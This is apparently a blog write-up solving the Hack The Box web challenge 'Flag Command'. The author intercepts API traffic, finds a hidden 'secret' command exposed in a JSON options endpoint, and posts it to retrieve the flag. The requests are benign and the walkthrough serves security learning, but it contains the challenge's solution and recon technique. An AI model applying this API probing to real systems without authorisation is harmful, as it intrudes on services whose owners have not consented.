---
layout: post
title: "Flag Command - HTB CTF Write-up"
date: 2026-04-22 00:00 -0300
categories: [CTF, Web Security]
tags: [api-exploitation, web, ctf, htb, caido, json, recon]
image: /assets/img/ctf/flag-command/caido-intercept.png
excerpt: "Navigating a whimsical text-based game to extract the flag by discovering a secret command hidden inside the API responses."
---

## Challenge Overview

**Category:** Web Security / API Exploitation  
**Target:** `http://154.57.164.76:31023/`

A whimsical, interactive text-based game where you wake up in a mysterious alien forest. Navigate singing squirrels, mischievous nymphs, and grumpy wizards in a labyrinth to find the flag. The key to solving this challenge was discovering a secret command hidden in the API responses.

---

## Methodology

### Step 1: Initial Reconnaissance

Using **Caido** proxy, I intercepted HTTP traffic to identify the application structure and API endpoints.

![Caido intercept showing initial traffic](/assets/img/ctf/flag-command/caido-intercept.png)

**Key Finding:** Discovered an API endpoint at `/api/options` that returned all possible game commands in JSON format.

```bash
curl http://154.57.164.76:31023/api/options
```

![API options endpoint response](/assets/img/ctf/flag-command/api-options-response.png)

---

### Step 2: API Response Analysis

The `/api/options` endpoint revealed all available commands organized by game stage:

```json
{
  "allPossibleCommands": {
    "1": ["HEAD NORTH", "HEAD WEST", "HEAD EAST", "HEAD SOUTH"],
    "2": ["GO DEEPER INTO THE FOREST", "FOLLOW A MYSTERIOUS PATH", "CLIMB A TREE", "TURN BACK"],
    "3": ["EXPLORE A CAVE", "CROSS A RICKETY BRIDGE", "FOLLOW A GLOWING BUTTERFLY", "SET UP CAMP"],
    "4": ["ENTER A MAGICAL PORTAL", "SWIM ACROSS A MYSTERIOUS LAKE", "FOLLOW A SINGING SQUIRREL", "BUILD A RAFT AND SAIL DOWNSTREAM"],
    "secret": ["Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"]
  }
}
```

The response contained a `"secret"` array with an unusual passphrase not shown anywhere in the game UI.

| Stage | Available Commands |
|-------|--------------------|
| 1 | HEAD NORTH, HEAD WEST, HEAD EAST, HEAD SOUTH |
| 2 | GO DEEPER INTO THE FOREST, FOLLOW A MYSTERIOUS PATH, CLIMB A TREE, TURN BACK |
| 3 | EXPLORE A CAVE, CROSS A RICKETY BRIDGE, FOLLOW A GLOWING BUTTERFLY, SET UP CAMP |
| 4 | ENTER A MAGICAL PORTAL, SWIM ACROSS A MYSTERIOUS LAKE, FOLLOW A SINGING SQUIRREL, BUILD A RAFT AND SAIL DOWNSTREAM |
| **Secret** | **Blip-blop, in a pickle with a hiccup! Shmiggity-shmack** |

---

### Step 3: Testing Out-of-Context Commands

I began interacting with the game by sending commands outside of the expected game flow through the `/api/monitor` endpoint.

**First attempt (invalid command):**

```http
POST /api/monitor HTTP/1.1
Host: 154.57.164.76:31023
Content-Type: application/json

{"command": "HEAD NORTH"}
```

**Response:**

```json
HTTP/1.1 500 INTERNAL SERVER ERROR
{"message": "What are you trying to break??"}
```

The server validated commands against the current game stage, rejecting inputs sent out of order.

---

### Step 4: Secret Command Exploitation

Sending the secret passphrase directly to `/api/monitor`:

```http
POST /api/monitor HTTP/1.1
Host: 154.57.164.76:31023
Content-Type: application/json

{"command": "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}
```

**Response:**

```json
HTTP/1.1 200 OK
{"message": "HTB{Fl4g}"}
```

---

## Key Takeaways

1. **API Enumeration** — Always probe endpoints like `/api/options` and `/api/config`. They frequently leak the full set of available actions, including hidden ones.
2. **Hidden Fields in JSON Responses** — Carefully examine every key in API responses. The `"secret"` array was invisible in the game UI but fully exposed in the raw JSON.
3. **Stage-Aware Validation** — The backend enforced context-dependent command validation, but the secret command bypassed it entirely.
4. **Proxy-First Workflow** — Intercepting traffic with Caido before interacting with the application revealed the hidden endpoint immediately.

---

## Tools Used

- **Caido** — HTTP proxy for intercepting and modifying traffic
- **curl** — Command-line endpoint testing
